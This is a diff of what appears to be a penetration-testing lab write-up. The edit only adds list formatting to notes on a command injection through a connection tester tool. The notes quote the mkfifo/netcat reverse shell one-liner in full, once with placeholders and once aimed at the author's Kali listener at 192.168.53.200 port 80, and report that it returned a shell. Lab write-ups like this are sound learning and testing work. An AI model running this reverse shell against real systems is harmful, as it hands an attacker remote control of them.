@@ -161,10 +161,10 @@ Enumerated top 200 UDP ports:
 ## Name of the technique
 ## Command injection from connection tester tool
 
-#### I attempted to type the usual netcat one liner reverse shell syntax but didn't work. I then tried "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [kali IP] [Listener Port] >/tmp/f" found in "pentestmonkey.net" but had to modify it to the following in order to get it to work: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.53.200 80 >/tmp/f" (the modification I added was the "-f" after command "rm") 
+#### - I attempted to type the usual netcat one liner reverse shell syntax but didn't work. I then tried "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [kali IP] [Listener Port] >/tmp/f" found in "pentestmonkey.net" but had to modify it to the following in order to get it to work: "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.53.200 80 >/tmp/f" (the modification I added was the "-f" after command "rm") 
 #mkfifoNetcatReverseShell
 
-#### Ran the syntax above on the connection tester tool and had a listener listening on my kali machine and received a reverse shell 
+#### - Ran the syntax above on the connection tester tool and had a listener listening on my kali machine and received a reverse shell 
 
 ![](Images/Pasted%20image%2020221018181728.png)
 
